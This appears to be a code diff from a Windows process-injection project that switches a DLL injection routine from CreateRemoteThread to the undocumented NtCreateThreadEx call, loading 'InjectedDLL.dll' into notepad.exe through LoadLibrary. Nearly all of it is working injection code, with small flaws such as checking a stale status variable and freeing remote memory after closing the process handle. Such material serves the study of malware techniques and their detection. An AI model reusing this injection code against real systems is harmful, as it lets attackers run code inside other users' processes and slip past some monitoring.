@@ -1,17 +1,38 @@
-#include "CreateRemoteThread_LoadLibrary.h"
+#include "NtCreateThreadEx.h"
 
-BOOL CreateRemoteThread_LoadLibrary()
+
+BOOL NtCreateThreadEx_Injection()
 {
-	/* Some vars */
+	// some vars
+	HMODULE hNtdll;
 	DWORD dwProcessId;
-	HANDLE hProcess, hThreadId;
-	HMODULE hKernel32;
-	FARPROC LoadLibraryAddress;
-	LPVOID lpBaseAddress;
+	HANDLE hProcess;
 	TCHAR lpDllName[] = _T("InjectedDLL.dll");
 	TCHAR lpDllPath[MAX_PATH];
+	LPVOID lpBaseAddress;
 	BOOL bStatus;
-	
+	HMODULE hKernel32;
+	FARPROC LoadLibraryAddress;
+	HANDLE  hRemoteThread = NULL;
+
+	// Function Pointer Typedef for NtCreateThreadEx
+	typedef NTSTATUS(WINAPI *pNtCreateThreadEx)(
+		OUT PHANDLE hThread,
+		IN ACCESS_MASK DesiredAccess,
+		IN LPVOID ObjectAttributes,
+		IN HANDLE ProcessHandle,
+		IN LPTHREAD_START_ROUTINE lpStartAddress,
+		IN LPVOID lpParameter,
+		IN BOOL CreateSuspended,
+		IN DWORD StackZeroBits,
+		IN DWORD SizeOfStackCommit,
+		IN DWORD SizeOfStackReserve,
+		OUT LPVOID lpBytesBuffer
+		);
+
+	// we have to import our function
+	pNtCreateThreadEx NtCreateThreadEx = NULL;
+
 	/* Get Process ID from Process name */
 	dwProcessId = GetProcessIdFromName(_T("notepad.exe"));
 	if (dwProcessId == NULL)
@@ -30,12 +51,28 @@ BOOL CreateRemoteThread_LoadLibrary()
 		return FALSE;
 	}
 
+	/* Get module handle of ntdll */
+	hNtdll = GetModuleHandle(_T("ntdll.dll"));
+	if (hNtdll == NULL) {
+		print_last_error(_T("GetModuleHandle"));
+		return FALSE;
+	}
+
 	/* Obtain a handle to kernel32 */
 	hKernel32 = GetModuleHandle(_T("kernel32.dll"));
 	if (hKernel32 == NULL) {
 		print_last_error(_T("GetModuleHandle"));
 		return FALSE;
 	}
+
+	// Get the address NtCreateThreadEx
+	_tprintf(_T("\t[+] Looking for NtCreateThreadEx in ntdll\n"));
+	NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
+	if (NtCreateThreadEx == NULL) {
+		print_last_error(_T("GetProcAddress"));
+		return FALSE;
+	}
+	_tprintf(_T("\t[+] Found at 0x%08x\n"), NtCreateThreadEx);
 
 	/* Get LoadLibrary address */
 	_tprintf(_T("\t[+] Looking for LoadLibrary in kernel32\n"));
@@ -70,21 +107,19 @@ BOOL CreateRemoteThread_LoadLibrary()
 	}
 
 	/* Create the more thread */
-	hThreadId = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryAddress, lpBaseAddress, NULL, 0);
+	NtCreateThreadEx(&hRemoteThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryAddress, lpBaseAddress, FALSE, NULL, NULL, NULL, NULL);
 	if (bStatus == NULL) {
-		print_last_error(_T("CreateRemoteThread"));
+		print_last_error(_T("NtCreateThreadEx"));
 		return FALSE;
 	}
 
 	else {
 		_tprintf(_T("Remote thread has been created successfully ...\n"));
-		WaitForSingleObject(hThreadId, INFINITE);
+		WaitForSingleObject(hRemoteThread, INFINITE);
 
 		// Clean up
 		CloseHandle(hProcess);
 		VirtualFreeEx(hProcess, lpBaseAddress, dwSize, MEM_RELEASE);
 		return TRUE;
 	}
-
-
 }
